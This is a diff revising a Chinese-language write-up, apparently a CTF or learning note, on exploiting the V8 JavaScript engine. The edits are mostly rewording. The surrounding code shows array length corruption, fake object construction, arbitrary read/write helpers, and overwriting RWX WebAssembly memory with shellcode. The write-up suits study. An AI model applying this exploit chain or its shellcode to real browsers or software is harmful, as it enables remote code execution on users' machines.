@@ -23,7 +23,7 @@ struct elements {
     type val[];
 }
 ```
-并且，elements 与 array 相邻。
+并且 `elements` 和数组对象本身是相邻的。
 
 ## 设想
 如果能通过别的漏洞把 `length` 改大，越界读写就变成了任意地址读写。
@@ -47,7 +47,7 @@ y = [x, x];
 %SystemBreak();
 ```
 
-得到回显，获得 x 的地址 **0x3f6e6bd15fc8 (0x3f6e6bd15fc9-1)**
+打印出来 `x` 的地址是 **0x3f6e6bd15fc8**（原文写作 `0x3f6e6bd15fc9-1`，减 1 就是去掉最低位的标记位）。
 ```
 DebugPrint: 0x3f6e6bd15fc9: [JSArray]
  - map: 0x1e41c779e6e1 <Map[32](PACKED_DOUBLE_ELEMENTS)> [FastProperties]
@@ -127,7 +127,7 @@ pwndbg> job 0x3f6e6bd15fc9
           15: 16 (0x4030000000000000)
  }
 ```
-可以看到，length 被修改成了 32。
+`length` 被改成了 32（也就是 `0x20`），数组的边界就此失守。
 
 ### 越界读
 申请一块 8 字节的 ArrayBuffer，再用 DataView 读写它——这样就能在 float64 和 uint64 之间来回转。
@@ -141,7 +141,7 @@ print(doublemap.toString(16));
 ```
 这样就成功读出了 `x[16]`，也就是 `x` 的 map 字段（double map 对应的值）。
 
-用同样的方法，读取 x 的 elements 字段的值
+用同样的方法读出 `x` 的 `elements` 字段：
 
 ### 伪造 double array
 ```C
@@ -153,6 +153,8 @@ x[0] = view.getFloat64(0, true);
 ```
 `x[0]`~`x[3]` 凑成一个 `fake array object`，其中 properties 字段为 0。
 
+能这么拼是因为浮点数组的 `elements` 里存的就是 double：用 `DataView` 按位写，可以精确控制每个 8 字节。`x[0]` 到 `x[3]` 一共 32 字节，正好是一个对象头——`map`、`properties`、`elements`、`length` 四个字段挨着摆。
+
 ### 获取 fake array object
 ```js
 view.setBigUint64(0, element+0x10n, true);
@@ -162,7 +164,7 @@ obj = y[0];
 通过越界写改掉 `y[0]`，也就是 `y` 的 elements 第一个槽，再从 `y[0]` 拿到伪造的对象。
 
 ### 任意读写
-成功获取了一个可以任意修改字段的 array 对象，然后可以通过修改其中的 elements 字段来达到任意地址写，将这个过程封装为函数
+现在手里有了一个字段可以随便改的 array 对象：改写它的 `elements`，读写就落到了任意地址上。把这两步封装成函数：
 ```js
 function readval(addr) {
     view.setBigUint64(0, addr-0x10n+1n, true);
@@ -186,7 +188,7 @@ function writeval(addr, val) {
 
 > WebAssembly (Wasm) 是一种**二进制指令格式**，旨在作为一种可移植的编译目标，用于在现代 Web 浏览器中运行高性能的应用程序。
 
-在生成 wasm 时，d8 会申请一个可读可写可执行的段，把 wasm 字节码覆写成 shellcode 就能劫持执行流了，下面就是 wasm 代码注入示例
+生成 wasm 时，d8 会申请一块可读可写可执行的段放字节码。把这块内存覆写成 shellcode，再让 JS 去调用它，执行流就到手了。
 ```js
 var wasmCode = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 133, 128, 128, 128, 0, 1, 96, 0, 1, 127, 3, 130, 128, 128, 128, 0, 1, 0, 4, 132, 128, 128, 128, 0, 1, 112, 0, 0, 5, 131, 128, 128, 128, 0, 1, 0, 1, 6, 129, 128, 128, 128, 0, 0, 7, 145, 128, 128, 128, 0, 2, 6, 109, 101, 109, 111, 114, 121, 2, 0, 4, 109, 97, 105, 110, 0, 0, 10, 138, 128, 128, 128, 0, 1, 132, 128, 128, 128, 0, 0, 65, 42, 11]);
 
@@ -195,7 +197,7 @@ var wasmInstance = new WebAssembly.Instance(wasmModule, {});
 var f = wasmInstance.exports.main;
 ```
 
-可以通过查看 wasmInstance 的 trusted_data 字段、 trusted_data 的 jump_table_start 字段得到可读可写可执行段的地址，然后通过任意地址写来覆盖 wasm 为 shellcode。
+地址这样拿：先读 `wasmInstance` 的 `trusted_data` 字段，再读 `trusted_data` 的 `jump_table_start`，就是那块可执行内存的起点；然后用任意地址写把 shellcode 盖上去。
 ```js
 let sc = [5188146770760222536n, 10180386957671122887n, 14035265928560645429n, 14359732973853474822n, 18388557918367661248n, 2409263538477991183n, 10416984888683040768n]
 
@@ -221,4 +223,4 @@ f();
 
 ## 特别鸣谢
 感谢 NepNep 战队的 [sysNow](https://sysnow.xyz/) 师傅。
-在写完 php 那篇文章后，sysNow 师傅正好给我发了一篇 V8 的文章，我刚好也趁着这个机会学习一下 V8，遇到不明白的也感谢 sysNow 师傅给我解答。
+写完 PHP 那篇之后，sysNow 师傅发来一篇 V8 的文章，正好顺势把 V8 也过了一遍；中间想不明白的地方，也都是他给讲的。
